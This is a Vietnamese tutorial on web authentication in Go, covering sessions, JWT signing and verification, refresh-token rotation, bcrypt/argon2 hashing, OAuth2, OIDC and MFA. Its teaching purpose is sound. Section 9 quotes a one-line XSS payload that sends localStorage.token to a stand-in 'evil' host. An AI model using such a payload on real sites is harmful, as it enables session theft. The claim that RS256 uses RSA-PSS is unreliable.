# Lesson 46 — Authentication & JWT

> Tier 4 · Web & Backend · Lesson 46
>
> **Tiền đề**: [L42 — net/http Deep](../lesson-42-http-net-deep/), [L43 — REST API Design](../lesson-43-rest-api-design/), [L45 — Request Validation](../lesson-45-request-validation/).
> **Tiếp theo**: [L47 — TLS & Crypto Basics](../lesson-47-tls-crypto-basics/).

## Mục tiêu bài học

Sau bài này bạn có thể:

- Phân biệt **authentication (AuthN)** và **authorization (AuthZ)** một cách rạch ròi, không nhầm lẫn.
- Hiểu **session-based auth** truyền thống: cookie + session store, cách scale và hạn chế.
- Hiểu **JWT** (JSON Web Token): cấu trúc `header.payload.signature`, claims chuẩn (RFC 7519), thuật toán ký (HS256, RS256, ES256) và vì sao **không bao giờ** dùng `alg: none`.
- Implement được flow **access token + refresh token** với rotation.
- Viết **auth middleware** chuẩn cho HTTP server Go, gắn user info vào `context.Context`.
- Hash password đúng cách bằng **bcrypt / argon2id**, biết vì sao SHA256 unsalted là sai lầm chết người.
- Nhận diện 4 lớp **security pitfall** phổ biến: `alg:none` attack, plaintext password, token store XSS, thiếu rate limit login.
- Biết khi nào dùng **OAuth2** (4 grant type) và **OpenID Connect**, MFA, PKCE cho mobile/SPA.

---

## 1. Authentication vs Authorization — đừng nhầm

Hai khái niệm thường bị gộp làm một, nhưng tách bạch sẽ khiến code rõ và an toàn hơn.

> 💡 **Trực giác**:
> - **AuthN** trả lời câu hỏi *"who are you?"* — kiểm tra danh tính. Như bảo vệ kiểm tra CMND ở cổng tòa nhà.
> - **AuthZ** trả lời câu hỏi *"what can you do?"* — kiểm tra quyền. Như thẻ từ chỉ mở được tầng 5, không mở được tầng 12.

| Khía cạnh | Authentication | Authorization |
|-----------|----------------|---------------|
| Câu hỏi | Bạn là ai? | Bạn được làm gì? |
| Đầu vào | Username/password, OTP, token, certificate, biometric | User identity (đã xác thực) + resource + action |
| Đầu ra | Identity (user ID, claims) hoặc fail | Allow / Deny |
| Vị trí trong stack | Trước AuthZ — luôn xác thực trước rồi mới phân quyền | Sau AuthN |
| Ví dụ Go | `parseJWT(token)` trả về `userID, role, err` | `if user.Role != "admin" { return 403 }` |

**Ví dụ flow đầy đủ** (request `DELETE /posts/42` từ Alice):

```
1. AuthN: server đọc Authorization header → parse JWT → userID = 7 (Alice).
2. AuthZ: server load post 42 → kiểm tra post.AuthorID == 7 hoặc Alice là admin?
   - Đúng → cho phép xóa, trả 204.
   - Sai → trả 403 Forbidden.
```

> ⚠ **Lỗi thường gặp**: gom AuthN + AuthZ vào cùng một middleware, dẫn tới code khó test và khó audit. Pattern tốt là **middleware AuthN** chỉ làm xác thực và gắn `userID` vào context, còn AuthZ làm ở handler hoặc middleware riêng cho từng route group.

> ❓ **Câu hỏi tự nhiên**:
> - *"Vì sao trả 401 với 403 khác nhau?"* — 401 = chưa xác thực (chưa biết bạn là ai); 403 = đã xác thực nhưng không đủ quyền. Trình duyệt khi gặp 401 sẽ bật lại dialog login (với `WWW-Authenticate`), 403 thì không.
> - *"Có cần AuthN trước khi rate-limit không?"* — Có nếu rate-limit theo user; không nếu rate-limit theo IP. Thường để rate-limit IP **trước** AuthN để chặn brute force login.

---

## 2. Session-based authentication — cách truyền thống

> 💡 **Trực giác**: server giữ một **sổ ghi** ai đã login (session store), phát cho client một **mã số ngẫu nhiên** (session ID) bỏ vào cookie. Mỗi request, server tra sổ xem mã đó đang ứng với ai.

### 2.1 Flow

```
1. Client POST /login với username + password.
2. Server verify password (bcrypt compare) → tạo session ID ngẫu nhiên 32 byte.
3. Server lưu vào store: { "sess_abc123": {userID: 7, expires: ...} }.
4. Server trả Set-Cookie: session=sess_abc123; HttpOnly; Secure; SameSite=Lax.
5. Mỗi request tiếp theo, browser tự gửi Cookie: session=sess_abc123.
6. Server đọc cookie → lookup store → biết userID = 7.
7. Logout: server xóa entry trong store, browser xóa cookie.
```

### 2.2 Session store

- **In-memory map** — fast, mất khi restart, không scale ngang (mỗi instance giữ store riêng).
- **Redis / Memcached** — phổ biến nhất, độ trễ < 1ms, scale ngang dễ.
- **Database (PostgreSQL)** — chậm hơn (10–50ms) nhưng durable, đơn giản hóa stack.

### 2.3 Ưu / nhược

| Ưu điểm | Nhược điểm |
|---------|-----------|
| **Revoke dễ**: xóa entry trong store là session vô hiệu ngay lập tức. | **Stateful**: mỗi instance backend phải share store → cần Redis. |
| **Session data linh hoạt**: lưu được nhiều thông tin (cart, preferences) ngay trong store. | **Round-trip thêm**: mỗi request đều phải hỏi store. |
| **Bảo mật**: session ID là số ngẫu nhiên, không lộ thông tin user. | **Cookie-based**: cần xử lý CSRF, không tự nhiên cho mobile native. |
| Thư viện cũ ổn định (Express, Django, Rails đã có sẵn). | Khó federate giữa nhiều service (mỗi service phải biết store chung). |

### 2.4 Ví dụ code (sketch Go)

```go
type Session struct {
    UserID    int
    ExpiresAt time.Time
}

var store = map[string]Session{} // production: Redis

func loginHandler(w http.ResponseWriter, r *http.Request) {
    // ... verify user/password
    sid := randomToken(32) // crypto/rand
    store[sid] = Session{UserID: 7, ExpiresAt: time.Now().Add(24 * time.Hour)}
    http.SetCookie(w, &http.Cookie{
        Name: "session", Value: sid,
        HttpOnly: true, Secure: true,
        SameSite: http.SameSiteLaxMode,
        Path: "/", MaxAge: 86400,
    })
}
```

> 📝 **Tóm tắt mục 2**: session = server lưu state, client chỉ giữ ID. Revoke dễ, scale khó hơn.

---

## 3. JWT — JSON Web Token (stateless token)

> 💡 **Trực giác**: thay vì lưu state trên server, **đóng gói** thông tin user (claims) vào chính token, **ký số** để chống giả mạo. Server chỉ cần verify chữ ký, không cần lookup. Như một **vé xem phim đã đóng dấu**: kiểm soát chỉ cần xác minh con dấu, không cần gọi điện về phòng vé.

### 3.1 Cấu trúc

JWT là **3 phần** nối bằng dấu chấm:

```
<header>.<payload>.<signature>
```

Cả 3 phần đều là **base64url** (không có padding `=`, dùng `-_` thay cho `+/`).

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9       <- header
.eyJzdWIiOiI0MiIsImV4cCI6MTcwMDAwMDAwMH0   <- payload
.5mZeRkKKt3xLcQAh7Q...                     <- signature
```

#### Header

```json
{"alg":"HS256","typ":"JWT"}
```

- `alg`: thuật toán ký (`HS256`, `RS256`, `ES256`, …).
- `typ`: luôn `"JWT"`.

#### Payload (claims)

```json
{"sub":"42","exp":1700000000,"role":"admin"}
```

Là một object JSON chứa các **claims** (xem mục 5).

#### Signature

```
HMAC_SHA256( base64url(header) + "." + base64url(payload), secret )
```

(với HS256). Server ký bằng secret, verify bằng cách ký lại và so sánh.

### 3.2 Ví dụ số cụ thể — encode tay JWT HS256

Cho:
- Header: `{"alg":"HS256","typ":"JWT"}` → base64url = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.
- Payload: `{"sub":"42","role":"admin"}` → base64url = `eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9`.
- Secret: `my-secret`.

Bước 1 — Signing input: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9`.

Bước 2 — `HMAC-SHA256(input, "my-secret")` → 32 byte → base64url.

Bước 3 — Token = `<header>.<payload>.<signature>`.

> ⚠ **Toy example**: không tự viết JWT lib cho production. Dùng `github.com/golang-jwt/jwt/v5`. Code trong `solutions.go` chỉ để **học**, có thiếu sót (không validate timing-attack-safe ở verify, không cover tất cả claim, không hỗ trợ key rotation).

### 3.3 Stateless = không cần lookup

Server không lưu gì cả. Chỉ giữ **secret** (HS256) hoặc **private key** (RS256). Verify một JWT chỉ là vài µs HMAC, không tốn DB.

> 📝 **Tóm tắt mục 3**: JWT = JSON đóng dấu. Header chỉ thuật toán, payload chứa claims, signature chống giả. Stateless = scale ngang dễ, đổi lại revoke khó.

---

## 4. JWT signing algorithms — chọn đúng cái

| Alg | Loại | Key | Khi nào dùng |
|-----|------|-----|--------------|
| **HS256** | Symmetric (HMAC + SHA-256) | Secret (≥ 32 byte ngẫu nhiên) | Monolith: 1 service ký + verify. Đơn giản nhất. |
| **HS384 / HS512** | Symmetric | Secret dài hơn | Tương tự HS256, hash mạnh hơn — hiếm khi cần. |
| **RS256** | Asymmetric (RSA + SHA-256) | Private key (sign) + Public key (verify) | Microservices: 1 service ký, nhiều service verify bằng public key. Public key có thể chia sẻ qua JWKS endpoint. |
| **RS384 / RS512** | Asymmetric | Tương tự RS256 | Tăng độ mạnh hash. |
| **ES256** | Asymmetric (ECDSA + SHA-256) | Elliptic curve key, gọn hơn RSA | Microservices, key nhỏ (256-bit ECDSA ~ 3072-bit RSA về độ an toàn). |
| **EdDSA** | Asymmetric (Ed25519) | Modern curve, sign nhanh | Service mới, nếu lib hỗ trợ. |
| **`none`** | KHÔNG ký | KHÔNG | **TUYỆT ĐỐI KHÔNG DÙNG**. Xem mục 15. |

### 4.1 HS256 — symmetric

```
sign:   HMAC-SHA256(input, secret) → signature
verify: HMAC-SHA256(input, secret) == signature?
```

Cùng `secret` dùng cho cả ký và verify. Ai có secret cũng ký được token hợp lệ → secret phải bảo vệ như password DB.

> ⚠ **Shared-secret risk**: nếu microservice A và B đều verify JWT bằng HS256 với cùng secret, B có thể giả mạo token của A. Trong môi trường nhiều service, **dùng RS256/ES256**.

### 4.2 RS256 — asymmetric

```
sign:   RSA-PSS-sign(SHA256(input), privateKey) → signature
verify: RSA-PSS-verify(SHA256(input), signature, publicKey) → bool
```

- Server auth giữ **private key** (bí mật).
- Mọi service khác chỉ cần **public key** để verify → không lo bị giả mạo.
- Public key có thể publish qua **JWKS** (`/.well-known/jwks.json`).

### 4.3 ES256 — elliptic curve

- Key 256-bit, signature ~ 64 byte (so với RSA 2048-bit signature 256 byte).
- Sign nhanh hơn RSA cùng cấp độ an toàn.
- Hỗ trợ tốt trong Go stdlib (`crypto/ecdsa`).

### 4.4 Ví dụ chọn alg

| Tình huống | Chọn |
|------------|------|
| Monolith Go, 1 service | HS256 (secret 32 byte ngẫu nhiên) |
| 5 microservice cùng team | RS256 (auth service ký, các service khác verify) |
| Mobile SDK verify token offline | ES256 (key gọn, mobile lib gọn) |
| Tích hợp với SSO (Google, Auth0) | RS256 (gần như chuẩn de facto) |

> 📝 **Tóm tắt mục 4**: HS = 1 secret cho cả 2 chiều; RS/ES = 2 key, public chia sẻ được. `none` = không bao giờ.

---

## 5. Common claims — RFC 7519

Claims là các trường trong payload. RFC 7519 định nghĩa **registered claims** (chuẩn quốc tế, viết tắt 3 ký tự) để mọi lib hiểu giống nhau.

| Claim | Tên đầy đủ | Ý nghĩa | Ví dụ |
|-------|------------|---------|-------|
| `iss` | Issuer | Ai phát token | `"https://auth.example.com"` |
| `sub` | Subject | Token nói về ai (thường là user ID) | `"42"` hoặc `"user:42"` |
| `aud` | Audience | Token dành cho ai (service nào nhận) | `"api.example.com"` hoặc `["api","admin"]` |
| `exp` | Expiration time | Hết hạn lúc nào (Unix timestamp) | `1700000000` |
| `nbf` | Not before | Trước thời điểm này token chưa hiệu lực | `1699999000` |
| `iat` | Issued at | Phát hành lúc nào | `1699998000` |
| `jti` | JWT ID | ID duy nhất của token (để revoke / chống replay) | `"abc-123-uuid"` |

Ngoài 7 claims chuẩn, bạn có thể tự thêm **private claims** (`role`, `email`, `permissions`, …).

### 5.1 Ví dụ payload đầy đủ

```json
{
  "iss": "https://auth.example.com",
  "sub": "42",
  "aud": "api.example.com",
  "exp": 1700000900,
  "nbf": 1700000000,
  "iat": 1700000000,
  "jti": "550e8400-e29b-41d4-a716-446655440000",
  "role": "admin",
  "email": "alice@example.com"
}
```

> ⚠ **Lỗi thường gặp**:
> - Quên check `exp` → token sống mãi.
> - Quên check `aud` → token cấp cho service A bị dùng ở service B (token confusion attack).
> - Bỏ `iat` → không kiểm tra được "token này quá cũ chưa" khi cần revoke theo thời gian.
> - Nhét password / credit card / PII lớn vào payload — JWT **không mã hóa**, chỉ ký. Bất cứ ai có token đều đọc được payload.

### 5.2 Verify checklist

Một verifier đúng chuẩn phải kiểm:

1. Header `alg` khớp với `alg` server expect (tránh `alg: none` attack).
2. Signature đúng với key.
3. `exp` > now.
4. `nbf` ≤ now (nếu có).
5. `iss` khớp.
6. `aud` khớp (chứa service mình).
7. (Tùy chọn) `jti` chưa nằm trong blacklist.

> 📝 **Tóm tắt mục 5**: claim là field JSON. 7 cái chuẩn (iss/sub/aud/exp/nbf/iat/jti). Verify phải check **alg + signature + exp + iss + aud**, không chỉ signature.

---

## 6. Thư viện Go — `github.com/golang-jwt/jwt/v5`

Đây là lib JWT phổ biến nhất trong cộng đồng Go.

```go
import "github.com/golang-jwt/jwt/v5"
```

Trong `solutions.go` của lesson này, **không phụ thuộc lib ngoài** — implement tay HMAC-SHA256 JWT bằng `crypto/hmac`, `crypto/sha256`, `encoding/base64`, `encoding/json` để bạn thấy "ruột" JWT trông như thế nào. Khi viết production thì dùng lib chính thức.

---

## 7. Sign & verify flow — code mẫu (lib chính thức)

```go
// SIGN
claims := jwt.MapClaims{
    "sub":  "42",
    "role": "admin",
    "exp":  time.Now().Add(15 * time.Minute).Unix(),
    "iat":  time.Now().Unix(),
}
token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
signed, err := token.SignedString([]byte(secret))
// signed = "eyJhbGciOiJIUzI1NiIsInR5..."

// VERIFY
parsed, err := jwt.Parse(signed, func(t *jwt.Token) (any, error) {
    // BẮT BUỘC check alg để tránh alg-confusion attack
    if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
        return nil, errors.New("unexpected signing method")
    }
    return []byte(secret), nil
})
if err != nil { /* invalid */ }
if claims, ok := parsed.Claims.(jwt.MapClaims); ok && parsed.Valid {
    userID := claims["sub"].(string)
    role := claims["role"].(string)
    // ...
}
```

> ⚠ **Quan trọng**: bên trong callback `keyFunc` phải kiểm tra `t.Method` đúng loại. Nếu không, attacker gửi token với `"alg":"none"` hoặc `"alg":"HS256"` (trong khi server expect RS256) — lib mặc định sẽ "chiều" theo header → bypass auth. Đây chính là `alg-confusion` attack.

### 7.1 Walk-through số

Giả sử secret = `"s"` (1 byte, demo). Claims = `{"sub":"1"}`.

1. `header` = `{"alg":"HS256","typ":"JWT"}` → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` (39 ký tự).
2. `payload` = `{"sub":"1"}` → `eyJzdWIiOiIxIn0` (15 ký tự).
3. `signing input` = header + `.` + payload = 55 ký tự.
4. `signature` = `HMAC_SHA256(input, "s")` = 32 byte → base64url 43 ký tự.
5. `token` = `header + "." + payload + "." + signature` = ~99 ký tự.

Token cuối cùng có dạng:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.<43-char-sig>
```

> 📝 **Tóm tắt mục 7**: sign = encode JSON 2 phần + HMAC. Verify = re-compute HMAC, compare bằng constant-time, sau đó check claims. Luôn check `alg` trong `keyFunc`.

---

## 8. Access token vs Refresh token

JWT một mình không đủ tốt cho production. Vấn đề lớn nhất: **revoke**. Một JWT đã phát mà hết hạn 30 ngày, user logout xong, token đó vẫn còn dùng được 30 ngày nữa nếu attacker chôm được — server không có cách hủy nếu hoàn toàn stateless.

Giải pháp: **dual token**.

| | Access token | Refresh token |
|--|--------------|----------------|
| Lifetime | Ngắn (5–15 phút) | Dài (7–30 ngày) |
| Dạng | JWT (stateless) | Opaque string ngẫu nhiên, lưu DB (stateful) |
| Dùng làm gì | Gửi kèm mọi API request | Đổi lấy access token mới khi access hết hạn |
| Verify ra sao | HMAC/RSA verify (nhanh) | DB lookup |
| Revoke được? | Không (chờ exp) | Có (xóa khỏi DB) |
| Lộ thì sao? | Tối đa 15 phút thiệt hại | Phải invalidate ngay trong DB |

### 8.1 Flow

```
[Login]
POST /login {user, pass} → server verify → trả về:
   { "access": "<JWT 15min>", "refresh": "rt_a1b2c3..." }
   (refresh lưu vào DB: { token: rt_a1b2c3, userID: 7, expires: now+30d })

[Bình thường]
GET /api/me  Authorization: Bearer <access>
   → server verify JWT → trả data.

[Access hết hạn]
GET /api/me → 401
client → POST /refresh { refresh: "rt_a1b2c3..." }
   → server lookup DB → ok → invalidate rt_a1b2c3 → tạo rt_d4e5f6 (rotation)
   → trả về { access: <JWT mới>, refresh: "rt_d4e5f6" }
```

### 8.2 Refresh token rotation

Mỗi lần dùng refresh, **cấp refresh mới** và **invalidate cái cũ**. Nếu attacker chôm refresh và dùng, server detect ngay khi user thật cố dùng refresh đã bị xoay (xem mục 15).

### 8.3 Vì sao 15 phút?

- Đủ ngắn để giảm thiệt hại nếu lộ.
- Đủ dài để client không phải refresh quá thường xuyên.
- 5–15 phút là khoảng phổ biến (Auth0 mặc định 24h, Google 1h, ngân hàng có khi 5 phút).

> ❓ **Câu hỏi tự nhiên**:
> - *"Tại sao access dùng JWT mà refresh không?"* — Access verify trên mọi request → JWT stateless nhanh. Refresh chỉ dùng vài lần/ngày → DB lookup không tốn kém, lại revoke được.
> - *"Lưu refresh vào DB tốn không?"* — Mỗi user 1 record, đọc/ghi vài lần/ngày, không phải hot path. Index theo token hash là đủ.

> 📝 **Tóm tắt mục 8**: access ngắn + stateless; refresh dài + stateful. Rotation = mỗi lần đổi token thì invalidate cái cũ.

---

## 9. Where to store token (browser side)

| Lưu ở đâu | XSS risk | CSRF risk | Khi nào dùng |
|-----------|----------|-----------|--------------|
| `localStorage` | **Cao** — JS chạy trong page đọc được hết | Không | Pure SPA, chấp nhận trade-off. Nhưng KHÔNG nên cho production có user thật. |
| `sessionStorage` | Cao như localStorage | Không | Hiếm khi tốt hơn localStorage. |
| Cookie `HttpOnly` + `Secure` + `SameSite=Lax` | Thấp (JS không đọc được) | Trung bình (cần CSRF token hoặc SameSite=Strict cho action critical) | **Khuyến nghị** cho hầu hết web app. |
| Cookie không HttpOnly | Cao + CSRF | Cao | KHÔNG. |
| In-memory (variable JS) | Thấp (mất khi reload) | Không | Mobile-style SPA: token chỉ sống trong session, refresh khi reload. |

### 9.1 Khuyến nghị thực tế

- **Access token**: in-memory JS variable. Mất khi reload, lấy lại bằng refresh.
- **Refresh token**: cookie `HttpOnly + Secure + SameSite=Strict`, path `/auth/refresh`. JS không đọc được → XSS không lấy được. Path hẹp → chỉ gửi khi gọi `/auth/refresh` → CSRF risk gần như 0.

### 9.2 Cookie attribute giải thích

- `HttpOnly`: JS không đọc được `document.cookie`.
- `Secure`: chỉ gửi qua HTTPS.
- `SameSite=Lax`: cookie chỉ gửi cho top-level navigation cùng site, không gửi cho cross-origin XHR thường → chống CSRF cơ bản.
- `SameSite=Strict`: không gửi cho **mọi** cross-origin request, kể cả click link → bảo mật mạnh nhất nhưng UX kém (login state mất khi click link từ email vào).
- `Path=/auth/refresh`: cookie chỉ gửi khi URL khớp prefix → giảm bề mặt tấn công.

> ⚠ **localStorage là cái bẫy lớn nhất với JWT**. Nhiều tutorial trên mạng dạy `localStorage.setItem("token", jwt)` rồi gửi qua Authorization header. Bất kỳ XSS nào (1 dòng `<img src=x onerror=fetch('//evil/?'+localStorage.token)>`) là lộ token, attacker dùng được đến khi token expire.

> 📝 **Tóm tắt mục 9**: Cookie HttpOnly cho refresh, in-memory cho access. localStorage = trade-off, hiểu mới dùng.

---

## 10. Auth middleware — chuẩn cho Go HTTP

Middleware đọc `Authorization: Bearer <token>`, verify, gắn user info vào `context.Context`.

```go
type ctxKey int
const userCtxKey ctxKey = 0

type User struct {
    ID   string
    Role string
}

func AuthMiddleware(secret []byte) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            authHeader := r.Header.Get("Authorization")
            if !strings.HasPrefix(authHeader, "Bearer ") {
                http.Error(w, "missing bearer token", http.StatusUnauthorized)
                return
            }
            tokenString := strings.TrimPrefix(authHeader, "Bearer ")

            claims, err := verifyJWT(tokenString, secret)
            if err != nil {
                http.Error(w, "invalid token: "+err.Error(), http.StatusUnauthorized)
                return
            }

            user := User{
                ID:   claims["sub"].(string),
                Role: claims["role"].(string),
            }
            ctx := context.WithValue(r.Context(), userCtxKey, user)
            next.ServeHTTP(w, r.WithContext(ctx))
        })
    }
}

// Helper cho handler lấy user
func UserFromContext(ctx context.Context) (User, bool) {
    u, ok := ctx.Value(userCtxKey).(User)
    return u, ok
}
```

### 10.1 Vì sao context, không global?

- `context.Context` là **per-request**, không có race condition.
- Handler nhận `r *http.Request`, đã có context → không cần thêm tham số.
- AuthZ middleware sau đó đọc user từ context, không cần parse token lần nữa.

### 10.2 Skip route nào?

Một số route (login, register, health) không cần auth. Pattern:

```go
mux := http.NewServeMux()
mux.HandleFunc("POST /login", loginHandler)
mux.HandleFunc("POST /register", registerHandler)
mux.HandleFunc("GET /health", healthHandler)

// Group có auth
authed := http.NewServeMux()
authed.HandleFunc("GET /me", meHandler)
authed.HandleFunc("DELETE /posts/{id}", deletePostHandler)
mux.Handle("/", AuthMiddleware(secret)(authed))
```

> 📝 **Tóm tắt mục 10**: middleware parse Bearer, verify, gắn user vào context. Route public không qua middleware.

---

## 11. Password hashing — không bao giờ lưu plaintext

> 💡 **Trực giác**: server không cần biết password thật, chỉ cần **chứng minh được** user gõ đúng. Hash 1 chiều cho phép verify mà không lưu nguyên gốc.

### 11.1 Hash function bạn KHÔNG nên dùng

| Hash | Vì sao tệ |
|------|-----------|
| **MD5** | Vỡ tan, collision dễ tạo, tính cực nhanh → brute force vài giây. |
| **SHA-1** | Collision đã chứng minh được. |
| **SHA-256 unsalted** | An toàn về collision nhưng **quá nhanh** (~ 10⁹ hash/giây trên GPU) → 8 ký tự brute force vài giờ. Rainbow table tấn công dễ. |
| **SHA-256 + salt** | Tốt hơn nhưng vẫn quá nhanh. KHÔNG đủ. |

### 11.2 Hash function dành cho password

Đặc điểm chung: **chậm có chủ đích** (work factor có thể tăng), **tốn RAM** (chống GPU/ASIC).

| Lib | Tham số | Thời gian/hash | Tốt cho |
|-----|---------|----------------|---------|
| **bcrypt** | cost 10–12 (~ 2^cost iteration) | ~ 100ms ở cost 12 | Đơn giản, đã chuẩn 20+ năm. `golang.org/x/crypto/bcrypt`. Giới hạn 72 byte password. |
| **scrypt** | N, r, p (N tốn RAM) | ~ 100ms với N=2^15 | Tốt, ít phổ biến hơn argon2 ngày nay. |
| **argon2id** | t (time), m (memory), p (parallel) | ~ 100ms với t=2, m=64MB | **Khuyến nghị hiện đại nhất** (PHC 2015 winner). `golang.org/x/crypto/argon2`. |
| **PBKDF2** | iterations | Có thể chậm, không tốn RAM nhiều | Legacy (đã có lâu trong PKCS#5). Vẫn OK nếu iterations đủ cao (≥ 600k với SHA-256). |

### 11.3 Vì sao "chậm" lại tốt?

- User chỉ verify 1 lần/login → 100ms không vấn đề.
- Attacker brute force 10⁹ password → 10⁹ × 100ms = 3 năm, không khả thi.
- Với SHA-256 unsalted, cùng 10⁹ password chỉ tốn ~ 1 giây trên GPU.

### 11.4 Walk-through bcrypt

```go
import "golang.org/x/crypto/bcrypt"

// HASH (lúc register)
hash, _ := bcrypt.GenerateFromPassword([]byte("hunter2"), 12)
// hash trông như: $2a$12$N9qo8uLOickgx2ZMRZoMye...
//                 ^   ^   ^                    ^
//                 alg cost salt                hash

// VERIFY (lúc login)
err := bcrypt.CompareHashAndPassword(hash, []byte(userInputPassword))
if err != nil {
    // mật khẩu sai (hoặc hash hỏng)
}
```

Format `$2a$12$<22-char-salt><31-char-hash>`:
- `2a`: bcrypt version.
- `12`: cost (2^12 = 4096 iteration).
- 22 ký tự sau là salt (16 byte base64), 31 ký tự cuối là hash (24 byte base64).

`bcrypt.CompareHashAndPassword` **constant-time** — không leak password đúng được bao nhiêu ký tự qua timing.

### 11.5 So sánh tốc độ cụ thể (laptop x86, single thread)

| Hash | Thời gian/hash | Hash/giây |
|------|----------------|-----------|
| `md5(password)` | ~ 500 ns | 2 × 10⁶ |
| `sha256(password)` | ~ 1 µs | 1 × 10⁶ |
| `bcrypt cost=10` | ~ 80 ms | 12 |
| `bcrypt cost=12` | ~ 320 ms | 3 |
| `argon2id t=2,m=64MB` | ~ 100 ms (RAM-bound, GPU lợi rất ít) | 10 |

Tăng cost từ 10 → 12 = chậm × 4 lần. Brute force vốn tốn 1 ngày → 4 ngày. Tăng tới 14 = 16 ngày. Đây là **dial bảo mật** mà bạn xoay theo phần cứng hiện đại.

> ⚠ **Lỗi thường gặp**:
> - Hash password ở client trước khi gửi ("để bảo vệ qua mạng"). Sai: hash đó trở thành password mới. Bảo mật qua mạng là việc của TLS.
> - Self-roll hash (`sha256(salt + password)` × 100000). Có thể đúng nhưng rủi ro lỗi vặt. Dùng lib chuẩn.
> - So sánh hash bằng `==`. **Phải dùng constant-time compare** (`bcrypt.CompareHashAndPassword`, `subtle.ConstantTimeCompare`).
> - Quên rehash khi tăng cost. Pattern: khi user login, kiểm tra cost của hash hiện tại — nếu thấp hơn target → hash lại với cost mới và lưu.

> 📝 **Tóm tắt mục 11**: bcrypt cost 12 hoặc argon2id. Constant-time compare. SHA-256 unsalted là tự sát.

---

## 12. OAuth2 — 4 grant type

OAuth2 không phải auth — nó là **delegation**: cho phép app A truy cập tài nguyên user X có trên service B mà không phải biết password của X ở B.

> 💡 **Trực giác**: "Cho phép app Spotify đọc danh sách bạn bè Facebook của tôi mà không đưa cho Spotify password Facebook." Facebook phát cho Spotify một **access token** chỉ dùng cho mục đích đã đồng ý.

### 12.1 Bốn grant type

| Grant | Ai dùng | Flow |
|-------|---------|------|
| **Authorization Code** | Web app có backend (server-side rendering hoặc API) | Redirect user → consent → server đổi code lấy token. |
| **Authorization Code + PKCE** | Mobile app, SPA | Như trên nhưng dùng PKCE (code verifier) thay vì client_secret. |
| **Client Credentials** | Machine-to-machine | Service A xin token từ auth server với client_id + client_secret. Không có user. |
| **Resource Owner Password** | Legacy (đã deprecated) | App nhận trực tiếp username + password user — chỉ dùng cho first-party app cũ. |
| **Implicit** (deprecated) | SPA trước thời PKCE | Phát token thẳng ở redirect → kém an toàn. **Không dùng nữa.** |

### 12.2 Authorization Code flow (chi tiết)

```
1. App → redirect user tới
   https://auth.example.com/authorize?
     response_type=code&
     client_id=app123&
     redirect_uri=https://app.com/callback&
     scope=read_profile&
     state=<random>
2. User login + consent ("Allow App đọc profile?") → Yes.
3. Auth server redirect lại:
   https://app.com/callback?code=<short-lived-code>&state=<random>
4. App backend gọi:
   POST https://auth.example.com/token
   { grant_type=authorization_code, code=<code>,
     client_id=app123, client_secret=xxx,
     redirect_uri=https://app.com/callback }
5. Auth server trả: { access_token, refresh_token, expires_in, scope }.
6. App dùng access_token gọi API resource.
```

`state` (random nonce) chống CSRF. `redirect_uri` phải match whitelist ở auth server.

### 12.3 PKCE — Proof Key for Code Exchange

Mobile/SPA không an toàn để giữ `client_secret`. PKCE thay thế:

```
1. App generate code_verifier (43-128 char random).
   code_challenge = base64url(SHA-256(code_verifier)).
2. Authorize redirect kèm code_challenge.
3. Khi đổi code lấy token, gửi code_verifier.
4. Auth server SHA-256 lại verifier, so với challenge đã giữ.
   Khớp → cấp token.
```

Attacker chôm `code` không có verifier → không đổi được token. **Mọi mobile/SPA hiện nay phải dùng PKCE.**

### 12.4 Client Credentials (M2M)

```
POST /token
{ grant_type=client_credentials,
  client_id=service-billing,
  client_secret=xxx,
  scope=read:invoice write:invoice }
→ { access_token: "..." }
```

Dùng khi service nội bộ gọi nhau, không có user.

> 📝 **Tóm tắt mục 12**: 4 grant. Web → Authorization Code. Mobile/SPA → Code + PKCE. Service ↔ Service → Client Credentials. Implicit & ROP đều deprecated.

---

## 13. OpenID Connect (OIDC)

OAuth2 là **authorization** (cấp quyền). OIDC là **identity layer** trên OAuth2, trả lời "user này là ai".

Bổ sung:
- `scope=openid` trong request.
- Trả thêm `id_token` (JWT) cùng `access_token`.
- `id_token` chứa claims chuẩn: `sub`, `name`, `email`, `email_verified`, `picture`, …
- `/.well-known/openid-configuration` — discovery endpoint, trả config + JWKS URL.

Google, Microsoft, Auth0, Okta đều dùng OIDC. Khi bạn "Sign in with Google", chính là OIDC.

```
[App] → Sign in with Google
   → Google trả về:
      access_token  (gọi Google API)
      id_token      (JWT, app verify để biết user là ai)
      refresh_token
```

App **verify id_token** (signature + iss + aud + exp) → trust được `id_token.sub` là user ID Google, `id_token.email` là email user.

> 📝 **Tóm tắt mục 13**: OIDC = OAuth2 + id_token. Dùng khi cần "đăng nhập bằng Google/Apple/Microsoft".

---

## 14. MFA — Multi-Factor Authentication

> 💡 **Trực giác**: 1 yếu tố (chỉ password) = 1 lớp rào. Lộ password = vào. MFA = thêm rào: phải qua **2 trong 3** yếu tố sau:

| Yếu tố | Ví dụ |
|--------|-------|
| **Something you know** | Password, PIN, câu hỏi bảo mật |
| **Something you have** | Phone (SMS, push), authenticator app (TOTP), hardware key (YubiKey) |
| **Something you are** | Vân tay, FaceID |

### 14.1 TOTP — Time-based One-Time Password (RFC 6238)

Là cơ chế cho Google Authenticator, Authy, 1Password.

```
secret = 20 byte ngẫu nhiên (server và app cùng có).
T = floor(unix_time / 30)
HMAC-SHA1(secret, T) → 20-byte → trích 4 byte → mod 10^6 → 6-digit code.
```

Code thay đổi mỗi 30 giây. Server nhận, tính lại với cùng T → so sánh. Cho phép skew ±1 step để tránh lệch đồng hồ.

### 14.2 SMS OTP

- Tiện cho user.
- **Không** an toàn nhất: SIM swap, SS7 attack, phishing.
- Vẫn tốt hơn không có. NIST khuyến nghị tránh nếu có thể.

### 14.3 WebAuthn / Passkey

Hardware key + biometric, signature challenge-response. Không phải mới phổ biến, dạy ở lesson nâng cao.

